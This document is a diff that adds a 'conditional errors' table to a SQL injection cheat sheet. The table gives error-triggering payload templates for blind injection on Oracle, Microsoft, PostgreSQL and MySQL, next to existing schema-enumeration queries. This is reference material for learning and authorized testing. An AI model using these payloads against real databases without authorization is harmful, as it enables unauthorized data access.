@@ -41,3 +41,17 @@
 |```SELECT * FROM all_tab_columns WHERE table_name = 'TABLE-NAME-HERE'```|*oracle*|
 |```SELECT * FROM information_schema.tables```|*microsoft, postgresql, mysql*|
 |```SELECT * FROM information_schema.columns WHERE table_name = 'TABLE-NAME-HERE'```|*microsoft, postgresql, mysql*|
+
+-----
+
+
+#### conditional errors
+
+| syntax | type |
+|:---:|:---:|
+|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN to_char(1/0) ELSE NULL END FROM dual```|*oracle*|
+|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END```|*microsoft*|
+|```SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN cast(1/0 as text) ELSE NULL END```|*postgresql*|
+|```SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a')```|*mysql*|
+
+-----
